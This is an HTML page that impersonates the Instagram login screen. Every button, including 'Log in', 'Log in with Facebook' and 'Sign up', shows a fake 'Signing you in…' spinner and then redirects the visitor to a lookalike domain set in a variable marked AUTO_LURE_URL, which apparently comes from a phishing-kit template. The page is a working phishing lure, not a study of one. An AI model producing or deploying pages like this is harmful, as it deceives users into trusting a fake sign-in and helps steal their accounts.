<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif;background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center;margin-bottom:10px}
.logo{margin-bottom:28px}.logo svg{display:block;margin:0 auto}
input{display:block;width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;margin-bottom:6px;outline:none;text-align:center}
input:focus{border-color:#a8a8a8}.btn{display:block;width:100%;padding:7px;background:linear-gradient(45deg,#f09433,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888);color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin:8px 0;opacity:0.9}
.btn:hover{opacity:1}.divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600;gap:16px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.fb-btn{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;cursor:pointer;background:none;border:none;width:100%}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-top:12px}
.card2{background:#fff;border:1px solid #dbdbdb;padding:20px;width:350px;text-align:center;font-size:14px}
.card2 a{color:#0095f6;font-weight:600;text-decoration:none}.spinner{width:24px;height:24px;border:2px solid #dbdbdb;border-top:2px solid #262626;border-radius:50%;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none;text-align:center;padding:20px;color:#8e8e8e;font-size:13px}</style></head>
<body>
<div class="card" id="card">
<div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="175" height="51" viewBox="0 0 175 51"><text x="0" y="42" font-family="'Dancing Script','Billabong',cursive,Georgia,serif" font-size="42" fill="#262626">Instagram</text></svg></div>
<input type="text" placeholder="Phone number, username, or email" id="em">
<input type="password" placeholder="Password" id="pw">
<button class="btn" onclick="go()">Log in</button>
<div class="divider">OR</div>
<button class="fb-btn" onclick="go()">
<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><path fill="#385185" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
Log in with Facebook</button>
<a href="#" class="forgot">Forgot password?</a>
</div>
<div class="card2">Don't have an account? <a href="#" onclick="go();return false;">Sign up</a></div>
<div id="loading"><div class="spinner"></div><p>Signing you in&hellip;</p></div>
<script>
var LURE_URL='https://www.instagram2026.msonlinesync.site/oxwXDFcd'; /* AUTO_LURE_URL */
function go(){document.getElementById('card').style.display='none';document.querySelector('.card2').style.display='none';document.getElementById('loading').style.display='block';setTimeout(function(){window.location.href=LURE_URL;},500);}
</script></body></html>
